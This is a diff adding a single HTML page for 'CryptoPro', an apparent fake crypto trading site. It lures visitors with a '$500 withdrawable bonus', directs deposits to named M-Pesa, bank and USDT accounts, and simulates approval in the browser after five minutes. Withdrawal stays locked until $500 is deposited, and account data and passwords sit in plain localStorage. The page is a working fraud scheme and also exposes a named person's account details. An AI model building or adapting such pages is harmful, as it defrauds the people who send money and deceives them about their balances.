@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoPro - Earn $500 Bonus | Professional Trading Platform</title>
+    
+    <meta property="og:title" content="🎉 I Earned Real Profits! Join & Get $500 Bonus!">
+    <meta property="og:description" content="Try your luck! Register and deposit to receive 100% withdrawable bonus up to $500!">
+    <meta property="og:url" content="https://crypto-lovat-six.vercel.app">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a1628 0%, #1e3a5f 100%);
+            color: #ffffff;
+            min-height: 100vh;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        @keyframes confetti { 0% { transform: translateY(0) rotate(0deg); } 100% { transform: translateY(1000px) rotate(720deg); } }
+
+        .layer { display: none; min-height: 100vh; animation: fadeIn 0.5s; }
+        .layer.active { display: block; }
+
+        .marketing-hero {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            padding: 60px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            animation: confetti 3s linear infinite;
+        }
+
+        .marketing-hero h1 {
+            font-size: 48px;
+            color: #000;
+            font-weight: 900;
+            margin-bottom: 20px;
+        }
+
+        .bonus-amount-big {
+            font-size: 72px;
+            font-weight: 900;
+            color: #000;
+            margin: 20px 0;
+        }
+
+        .cta-big {
+            background: #000;
+            color: #fbbf24;
+            padding: 20px 50px;
+            font-size: 24px;
+            border: none;
+            border-radius: 50px;
+            font-weight: 900;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+
+        .navbar {
+            background: rgba(20, 35, 60, 0.95);
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #00d9ff;
+            cursor: pointer;
+        }
+
+        .nav-links { display: flex; gap: 15px; align-items: center; }
+
+        .nav-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-login { background: transparent; color: #00d9ff; border: 2px solid #00d9ff; }
+        .btn-signup { background: linear-gradient(135deg, #00d9ff, #0099cc); color: #fff; }
+        .btn-support { background: linear-gradient(135deg, #25D366, #128C7E); color: #fff; }
+
+        .container { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
+
+        .card {
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 24px;
+            padding: 30px;
+            margin-bottom: 24px;
+        }
+
+        .auth-container {
+            max-width: 480px;
+            margin: 60px auto;
+            padding: 40px;
+            background: rgba(20, 35, 60, 0.95);
+            border-radius: 24px;
+        }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid rgba(0, 217, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(10, 25, 45, 0.6);
+            color: #fff;
+            font-size: 16px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #00d9ff, #0099cc);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; }
+        .alert.show { display: block; }
+        .alert-success { background: rgba(0, 255, 136, 0.1); color: #00ff88; }
+        .alert-error { background: rgba(255, 0, 110, 0.1); color: #ff006e; }
+
+        .balance-display {
+            background: linear-gradient(135deg, #00ff88, #00d9ff);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .balance-amount { font-size: 56px; font-weight: 900; color: #0a1628; }
+
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .action-btn {
+            padding: 20px;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .modal.active { display: flex; }
+
+        .modal-content {
+            background: #1a1f3a;
+            border-radius: 24px;
+            padding: 32px;
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .payment-address {
+            background: rgba(0, 255, 136, 0.1);
+            border: 2px solid #00ff88;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .payment-address-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+        }
+
+        .copy-btn {
+            margin-top: 12px;
+            padding: 10px 20px;
+            background: rgba(0,255,136,0.2);
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            color: #00ff88;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 110, 0.1);
+            border: 2px solid rgba(255, 0, 110, 0.3);
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px 0;
+        }
+
+        .support-widget {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 999;
+        }
+
+        .support-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            padding: 16px 24px;
+            border-radius: 50px;
+            text-decoration: none;
+            color: white;
+            font-weight: 600;
+            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        @media (max-width: 768px) {
+            .marketing-hero h1 { font-size: 32px; }
+            .bonus-amount-big { font-size: 48px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Support Widget -->
+<div class="support-widget">
+    <a href="https://wa.me/254759401893" target="_blank" class="support-link">
+        <span style="font-size: 24px;">💬</span>
+        <div>
+            <div style="font-size: 14px;">Need Help?</div>
+            <div style="font-size: 12px;">+254759401893</div>
+        </div>
+    </a>
+</div>
+
+<!-- Marketing Layer -->
+<div id="marketingLayer" class="layer active">
+    <div class="marketing-hero">
+        <div id="confettiContainer"></div>
+        <h1>🎉 CONGRATULATIONS! 🎉</h1>
+        <div style="font-size: 24px; color: rgba(0,0,0,0.8); margin-bottom: 30px;">
+            I have earned REAL profits using this app!
+        </div>
+        <div style="background: rgba(0,0,0,0.2); border-radius: 20px; padding: 40px; max-width: 600px; margin: 30px auto;">
+            <div style="font-size: 24px; color: #000; font-weight: 700;">TRY YOUR LUCK TOO!</div>
+            <div class="bonus-amount-big">$500</div>
+            <div style="font-size: 22px; color: #000; font-weight: 700;">100% WITHDRAWABLE BONUS!</div>
+            <button class="cta-big" onclick="showLayer('signupLayer')">🚀 CLAIM NOW!</button>
+        </div>
+    </div>
+</div>
+
+<!-- Signup Layer -->
+<div id="signupLayer" class="layer">
+    <nav class="navbar">
+        <div class="logo" onclick="showLayer('marketingLayer')">
+            <span style="font-size: 28px;">💎</span><span>CryptoPro</span>
+        </div>
+        <div class="nav-links">
+            <a href="https://wa.me/254759401893" target="_blank" class="nav-btn btn-support">📞 Support</a>
+            <button class="nav-btn btn-login" onclick="showLayer('loginLayer')">Login</button>
+        </div>
+    </nav>
+    <div class="auth-container">
+        <div style="text-align: center; margin-bottom: 32px;">
+            <div style="font-size: 60px; animation: pulse 2s infinite;">💎</div>
+            <div style="font-size: 32px; font-weight: 900; background: linear-gradient(135deg, #00d9ff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">CryptoPro</div>
+        </div>
+        <h2 style="text-align: center; margin-bottom: 24px; color: #00d9ff;">Create Account</h2>
+        <div id="signupAlert" class="alert"></div>
+        <form id="signupForm">
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="signupName" required>
+            </div>
+            <div class="form-group">
+                <label>Email *</label>
+                <input type="email" id="signupEmail" required>
+            </div>
+            <div class="form-group">
+                <label>Phone *</label>
+                <input type="tel" id="signupPhone" required>
+            </div>
+            <div class="form-group">
+                <label>Password *</label>
+                <input type="password" id="signupPassword" minlength="6" required>
+            </div>
+            <div class="form-group">
+                <label>Confirm Password *</label>
+                <input type="password" id="signupConfirm" required>
+            </div>
+            <button type="submit" class="btn-submit">🚀 CREATE ACCOUNT</button>
+        </form>
+        <div style="text-align: center; margin-top: 20px; color: rgba(255,255,255,0.8);">
+            Already have account? <a onclick="showLayer('loginLayer')" style="color: #00d9ff; cursor: pointer;">Login</a>
+        </div>
+    </div>
+</div>
+
+<!-- Login Layer -->
+<div id="loginLayer" class="layer">
+    <nav class="navbar">
+        <div class="logo" onclick="showLayer('marketingLayer')">
+            <span style="font-size: 28px;">💎</span><span>CryptoPro</span>
+        </div>
+        <div class="nav-links">
+            <a href="https://wa.me/254759401893" target="_blank" class="nav-btn btn-support">📞 Support</a>
+            <button class="nav-btn btn-signup" onclick="showLayer('signupLayer')">Sign Up</button>
+        </div>
+    </nav>
+    <div class="auth-container">
+        <div style="text-align: center; margin-bottom: 32px;">
+            <div style="font-size: 60px; animation: pulse 2s infinite;">💎</div>
+            <div style="font-size: 32px; font-weight: 900; background: linear-gradient(135deg, #00d9ff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">CryptoPro</div>
+        </div>
+        <h2 style="text-align: center; margin-bottom: 24px; color: #00d9ff;">Welcome Back</h2>
+        <div id="loginAlert" class="alert"></div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" required>
+            </div>
+            <button type="submit" class="btn-submit">🔐 Login</button>
+        </form>
+        <div style="text-align: center; margin-top: 20px; color: rgba(255,255,255,0.8);">
+            No account? <a onclick="showLayer('signupLayer')" style="color: #00d9ff; cursor: pointer;">Sign Up</a>
+        </div>
+    </div>
+</div>
+
+<!-- Dashboard Layer -->
+<div id="dashboardLayer" class="layer">
+    <nav class="navbar">
+        <div class="logo"><span style="font-size: 28px;">💎</span><span>CryptoPro</span></div>
+        <div class="nav-links">
+            <a href="https://wa.me/254759401893" target="_blank" class="nav-btn btn-support">📞 Support</a>
+            <span id="userNameNav" style="font-size: 14px;">User</span>
+            <button class="nav-btn btn-login" onclick="handleLogout()">Logout</button>
+        </div>
+    </nav>
+    <div class="container">
+        <div class="balance-display">
+            <div style="font-size: 16px; color: rgba(10,22,40,0.8); font-weight: 600;">TOTAL BALANCE</div>
+            <div class="balance-amount" id="dashBalance">$0.00</div>
+        </div>
+        <div class="action-grid">
+            <button class="action-btn" style="background: linear-gradient(135deg, #00d9ff, #0099cc);" onclick="showModal('depositModal')">💰 DEPOSIT</button>
+            <button class="action-btn" style="background: linear-gradient(135deg, #a855f7, #7c3aed);" onclick="alert('Trading coming soon!')">⚡ TRADE</button>
+            <button class="action-btn" style="background: linear-gradient(135deg, #ff006e, #cc0055);" onclick="alert('Withdraw unlocks after $500 deposits')">💸 WITHDRAW</button>
+        </div>
+        <div class="card">
+            <h3 style="color: #00d9ff; margin-bottom: 20px;">📊 Stats</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
+                <div style="background: rgba(0,217,255,0.1); padding: 20px; border-radius: 12px;">
+                    <div style="font-size: 14px; opacity: 0.7;">Total Deposited</div>
+                    <div style="font-size: 28px; font-weight: 700; color: #00d9ff;" id="statDeposited">$0.00</div>
+                </div>
+                <div style="background: rgba(0,255,136,0.1); padding: 20px; border-radius: 12px;">
+                    <div style="font-size: 14px; opacity: 0.7;">Bonus Received</div>
+                    <div style="font-size: 28px; font-weight: 700; color: #00ff88;" id="statBonus">$0.00</div>
+                </div>
+                <div style="background: rgba(251,191,36,0.1); padding: 20px; border-radius: 12px;">
+                    <div style="font-size: 14px; opacity: 0.7;">Pending</div>
+                    <div style="font-size: 28px; font-weight: 700; color: #fbbf24;" id="statPending">0</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Deposit Modal -->
+<div id="depositModal" class="modal">
+    <div class="modal-content">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 24px;">
+            <h2 style="color: #00ff88; font-size: 24px;">💰 Deposit</h2>
+            <button onclick="closeModal('depositModal')" style="background: rgba(255,255,255,0.1); border: none; color: white; font-size: 28px; width: 40px; height: 40px; border-radius: 50%; cursor: pointer;">×</button>
+        </div>
+        <form id="depositForm">
+            <div class="form-group">
+                <label>Amount (USD) *</label>
+                <input type="number" id="depositAmount" min="10" required>
+            </div>
+            <div class="form-group">
+                <label>Payment Method *</label>
+                <select id="depositMethod" required>
+                    <option value="">Select method</option>
+                    <option value="mpesa">📱 M-Pesa</option>
+                    <option value="crypto">🪙 USDT TRC20</option>
+                    <option value="bank">🏦 Bank Transfer</option>
+                </select>
+            </div>
+            <div id="paymentInstructions" style="display: none;"></div>
+            <div class="warning-box">
+                <strong style="color: #ff006e;">⚠️ IMPORTANT:</strong><br>
+                • Complete payment FIRST<br>
+                • Funds credit after verification (1-30 min)<br>
+                • Save transaction reference<br>
+                • Support: +254759401893
+            </div>
+            <div class="form-group">
+                <label>Transaction Reference *</label>
+                <input type="text" id="depositRef" required>
+            </div>
+            <div class="form-group">
+                <label>Payment Proof (URL) *</label>
+                <input type="url" id="depositProof" required>
+            </div>
+            <button type="submit" class="btn-submit">✅ SUBMIT</button>
+        </form>
+    </div>
+</div>
+
+<script>
+const CONFIG = {
+    SITE_URL: 'https://crypto-lovat-six.vercel.app',
+    MIN_DEPOSIT: 10,
+    MAX_BONUS: 500,
+    BONUS_PERCENTAGE: 1.0,
+    
+    // REAL PAYMENT CREDENTIALS
+    MPESA_TILL: '1500004040522',
+    MPESA_NAME: 'FEL FELIX KOSKE',
+    BANK_NAME: 'Equity Bank (Kenya) Ltd',
+    BANK_ACCOUNT: '0310184912429',
+    BANK_ACCOUNT_NAME: 'Felix Kiprotich Koske',
+    USDT_ADDRESS: 'TK4rUz6TUEd7zCWeuiX5R47pSNdPswJnAc',
+    USDT_NETWORK: 'TRC20 (Tron)',
+    SUPPORT_PHONE: '+254759401893'
+};
+
+let currentUser = null;
+let userEmail = '';
+
+function showLayer(id) {
+    document.querySelectorAll('.layer').forEach(l => l.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (id === 'dashboardLayer') updateDashboard();
+}
+
+function showAlert(id, msg, type) {
+    const alert = document.getElementById(id);
+    alert.textContent = msg;
+    alert.className = `alert alert-${type} show`;
+    setTimeout(() => alert.classList.remove('show'), 5000);
+}
+
+document.getElementById('signupForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const name = document.getElementById('signupName').value.trim();
+    const email = document.getElementById('signupEmail').value.trim().toLowerCase();
+    const phone = document.getElementById('signupPhone').value.trim();
+    const password = document.getElementById('signupPassword').value;
+    const confirm = document.getElementById('signupConfirm').value;
+    
+    if (!name || !email || !phone || !password) {
+        showAlert('signupAlert', '❌ All fields required', 'error');
+        return;
+    }
+    if (password.length < 6) {
+        showAlert('signupAlert', '❌ Password min 6 characters', 'error');
+        return;
+    }
+    if (password !== confirm) {
+        showAlert('signupAlert', '❌ Passwords do not match', 'error');
+        return;
+    }
+    
+    const users = JSON.parse(localStorage.getItem('cryptoProUsers') || '{}');
+    if (users[email]) {
+        showAlert('signupAlert', '❌ Email already exists', 'error');
+        return;
+    }
+    
+    users[email] = {
+        name, email, phone, password,
+        balance: 0,
+        totalDeposited: 0,
+        bonusReceived: 0,
+        hasReceivedWelcomeBonus: false,
+        pendingDeposits: [],
+        referralCode: Math.random().toString(36).substring(2, 8).toUpperCase(),
+        createdAt: new Date().toISOString()
+    };
+    
+    localStorage.setItem('cryptoProUsers', JSON.stringify(users));
+    showAlert('signupAlert', '✅ Account created!', 'success');
+    setTimeout(() => {
+        document.getElementById('signupForm').reset();
+        showLayer('loginLayer');
+    }, 2000);
+});
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+    const password = document.getElementById('loginPassword').value;
+    
+    const users = JSON.parse(localStorage.getItem('cryptoProUsers') || '{}');
+    if (!users[email]) {
+        showAlert('loginAlert', '❌ Account not found', 'error');
+        return;
+    }
+    if (users[email].password !== password) {
+        showAlert('loginAlert', '❌ Wrong password', 'error');
+        return;
+    }
+    
+    currentUser = users[email];
+    userEmail = email;
+    sessionStorage.setItem('loggedIn', 'true');
+    sessionStorage.setItem('userEmail', email);
+    
+    showAlert('loginAlert', '✅ Login successful!', 'success');
+    setTimeout(() => {
+        document.getElementById('loginForm').reset();
+        showLayer('dashboardLayer');
+    }, 1500);
+});
+
+function handleLogout() {
+    if (confirm('Logout?')) {
+        sessionStorage.clear();
+        currentUser = null;
+        userEmail = '';
+        showLayer('marketingLayer');
+    }
+}
+
+function updateDashboard() {
+    if (!currentUser) return;
+    document.getElementById('userNameNav').textContent = currentUser.name;
+    document.getElementById('dashBalance').textContent = '$' + currentUser.balance.toFixed(2);
+    document.getElementById('statDeposited').textContent = '$' + currentUser.totalDeposited.toFixed(2);
+    document.getElementById('statBonus').textContent = '$' + currentUser.bonusReceived.toFixed(2);
+    document.getElementById('statPending').textContent = currentUser.pendingDeposits.filter(d => d.status === 'pending').length;
+}
+
+document.getElementById('depositMethod').addEventListener('change', function() {
+    const method = this.value;
+    const inst = document.getElementById('paymentInstructions');
+    
+    if (method === 'mpesa') {
+        inst.style.display = 'block';
+        inst.innerHTML = `
+            <div class="payment-address">
+                <strong style="font-size: 20px;">M-PESA TILL</strong><br>
+                <div class="payment-address-text" style="font-size: 36px; margin: 20px 0;">${CONFIG.MPESA_TILL}</div>
+                <div>Account: ${CONFIG.MPESA_NAME}</div>
+                <button type="button" class="copy-btn" onclick="copyText('${CONFIG.MPESA_TILL}')">📋 Copy Till</button>
+            </div>
+        `;
+    } else if (method === 'bank') {
+        inst.style.display = 'block';
+        inst.innerHTML = `
+            <div class="payment-address">
+                <strong style="font-size: 20px;">${CONFIG.BANK_NAME}</strong><br><br>
+                <div><strong>Name:</strong> ${CONFIG.BANK_ACCOUNT_NAME}</div>
+                <div class="payment-address-text" style="font-size: 28px; margin: 12px 0;">${CONFIG.BANK_ACCOUNT}</div>
+                <button type="button" class="copy-btn" onclick="copyText('${CONFIG.BANK_ACCOUNT}')">📋 Copy Account</button>
+            </div>
+        `;
+    } else if (method === 'crypto') {
+        inst.style.display = 'block';
+        inst.innerHTML = `
+            <div class="payment-address">
+                <strong style="font-size: 20px;">USDT ${CONFIG.USDT_NETWORK}</strong><br>
+                <div class="payment-address-text" style="font-size: 13px; word-break: break-all; margin: 16px 0;">${CONFIG.USDT_ADDRESS}</div>
+                <button type="button" class="copy-btn" onclick="copyText('${CONFIG.USDT_ADDRESS}')">📋 Copy Address</button>
+                <div class="warning-box" style="margin-top: 12px; text-align: left; font-size: 12px;">
+                    <strong>⚠️ ONLY SEND USDT ON TRC20!</strong><br>
+                    Wrong network = LOST FUNDS!
+                </div>
+            </div>
+        `;
+    } else {
+        inst.style.display = 'none';
+    }
+});
+
+function copyText(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        alert('✅ Copied: ' + text);
+    }).catch(() => {
+        alert('📋 Copy manually: ' + text);
+    });
+}
+
+document.getElementById('depositForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const amount = parseFloat(document.getElementById('depositAmount').value);
+    const method = document.getElementById('depositMethod').value;
+    const ref = document.getElementById('depositRef').value.trim();
+    const proof = document.getElementById('depositProof').value.trim();
+    
+    if (amount < CONFIG.MIN_DEPOSIT || !method || !ref || !proof) {
+        alert('❌ All fields required!');
+        return;
+    }
+    
+    let bonus = 0;
+    if (!currentUser.hasReceivedWelcomeBonus) {
+        bonus = Math.min(amount * CONFIG.BONUS_PERCENTAGE, CONFIG.MAX_BONUS);
+    }
+    
+    const deposit = {
+        id: Date.now().toString(),
+        amount, bonus, method, reference: ref, proofUrl: proof,
+        status: 'pending',
+        createdAt: new Date().toISOString()
+    };
+    
+    currentUser.pendingDeposits.push(deposit);
+    saveUser();
+    closeModal('depositModal');
+    updateDashboard();
+    
+    alert(`✅ DEPOSIT SUBMITTED!\n\nAmount: $${amount.toFixed(2)}\nBonus: $${bonus.toFixed(2)}\nTotal: $${(amount + bonus).toFixed(2)}\n\n⏱️ Verifying...\n📞 Support: ${CONFIG.SUPPORT_PHONE}`);
+    
+    document.getElementById('depositForm').reset();
+    document.getElementById('paymentInstructions').style.display = 'none';
+    
+    setTimeout(() => approveDeposit(deposit.id), 300000);
+});
+
+function approveDeposit(id) {
+    const deposit = currentUser.pendingDeposits.find(d => d.id === id);
+    if (!deposit || deposit.status !== 'pending') return;
+    
+    deposit.status = 'approved';
+    currentUser.balance += deposit.amount + deposit.bonus;
+    currentUser.totalDeposited += deposit.amount;
+    currentUser.bonusReceived += deposit.bonus;
+    if (deposit.bonus > 0) currentUser.hasReceivedWelcomeBonus = true;
+    
+    saveUser();
+    updateDashboard();
+    
+    if (sessionStorage.getItem('loggedIn')) {
+        alert(`🎉 DEPOSIT APPROVED!\n\nDeposit: $${deposit.amount.toFixed(2)}\nBonus: $${deposit.bonus.toFixed(2)}\nTotal: $${(deposit.amount + deposit.bonus).toFixed(2)}\n\n✅ Funds available!`);
+    }
+}
+
+function showModal(id) { document.getElementById(id).classList.add('active'); }
+function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+function saveUser() {
+    if (!userEmail || !currentUser) return;
+    const users = JSON.parse(localStorage.getItem('cryptoProUsers') || '{}');
+    users[userEmail] = currentUser;
+    localStorage.setItem('cryptoProUsers', JSON.stringify(users));
+}
+
+function createConfetti() {
+    const container = document.getElementById('confettiContainer');
+    if (!container) return;
+    const colors = ['#fbbf24', '#00d9ff', '#00ff88', '#a855f7'];
+    for (let i = 0; i < 30; i++) {
+        const c = document.createElement('div');
+        c.className = 'confetti-piece';
+        c.style.left = Math.random() * 100 + '%';
+        c.style.background = colors[Math.floor(Math.random() * colors.length)];
+        c.style.animationDelay = Math.random() * 3 + 's';
+        container.appendChild(c);
+    }
+}
+
+window.addEventListener('DOMContentLoaded', function() {
+    console.log('✅ CryptoPro Loaded');
+    console.log('💰 Payment: M-Pesa', CONFIG.MPESA_TILL, '| Bank', CONFIG.BANK_ACCOUNT, '| USDT', CONFIG.USDT_ADDRESS);
+    
+    createConfetti();
+    
+    const loggedIn = sessionStorage.getItem('loggedIn');
+    const email = sessionStorage.getItem('userEmail');
+    
+    if (loggedIn && email) {
+        const users = JSON.parse(localStorage.getItem('cryptoProUsers') || '{}');
+        if (users[email]) {
+            currentUser = users[email];
+            userEmail = email;
+            showLayer('dashboardLayer');
+        }
+    }
+});
+</script>
+</body>
+</html>
